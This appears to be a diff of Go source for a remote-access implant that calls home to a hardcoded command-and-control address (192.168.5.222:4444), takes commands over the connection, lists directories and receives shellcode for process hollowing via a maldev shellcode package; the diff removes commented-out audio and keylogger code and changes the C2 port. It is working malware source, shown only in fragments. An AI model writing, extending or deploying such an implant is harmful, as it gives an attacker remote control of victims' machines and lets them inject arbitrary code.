@@ -11,10 +11,6 @@ import (
 	"time"
 
 	"github.com/D3Ext/maldev/shellcode"
-	// "github.com/faiface/beep"
-	// "github.com/faiface/beep/mp3"
-	// "github.com/faiface/beep/speaker"
-	//"github.com/MarinX/keylogger"
 )
 
 func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
@@ -144,34 +140,8 @@ func ls(conn *net.Conn, implantWD *string) {
 		dirListing + "\n")) //Looks funky but I want it organized
 }
 
-// func receiveNPlayAudio(conn *net.Conn) { //Needs some fixing
-// 	fmt.Println("Recieveing Audio ...")
-// 	music := make([]byte, 3145728) //Track limit is 3MB
-// 	read_len, err := (*conn).Read(music)
-// 	if err != nil {
-// 		fmt.Println("Couldnt Play the Track")
-// 		return
-// 	}
-// 	if read_len < 1 {
-// 		fmt.Println("Couldnt Play the Track")
-// 		return
-// 	}
-// 	musicCut := music[:read_len]
-// 	musicBytesReader := bytes.NewReader(musicCut)
-// 	streamer, format, err := mp3.Decode(musicBytesReader)
-// 	if err != nil {
-// 		fmt.Println("Something Wrong")
-// 	}
-// 	speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))
-// 	buffer := beep.NewBuffer(format)
-// 	buffer.Append(streamer)
-// 	streamer.Close()
-// 	take := buffer.Streamer(0, buffer.Len())
-// 	speaker.Play(take)
-// }
-
 func main() {
-	c2Address := "192.168.5.222:444"
+	c2Address := "192.168.5.222:4444"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -200,10 +170,6 @@ func main() {
 				fmt.Println(output)
 				conn.Write([]byte("NoTime2Die\n"))
 			}
-		// case "play\n":
-		// 	{
-		// 		receiveNPlayAudio(&conn) //Needs time 2 fix
-		// 	}
 		case "barCode\n":
 			{
 				barCodeLoad(&conn)
@@ -227,7 +193,6 @@ func main() {
 			}
 		case "hollow\n":
 			{
-				//Hardcore method below
 				conn.Write([]byte("OK\n"))
 				//Check if the file even exists
 				buffer := make([]byte, 60838412)
@@ -262,6 +227,7 @@ func main() {
 					fmt.Println("Couldn't get shellcode")
 					return
 				}
+				//Hardcore method below
 				// //Create a buffer to recieve the shellcode and fire it
 				// read_len, err = conn.Read(buffer)
 				// if err != nil {
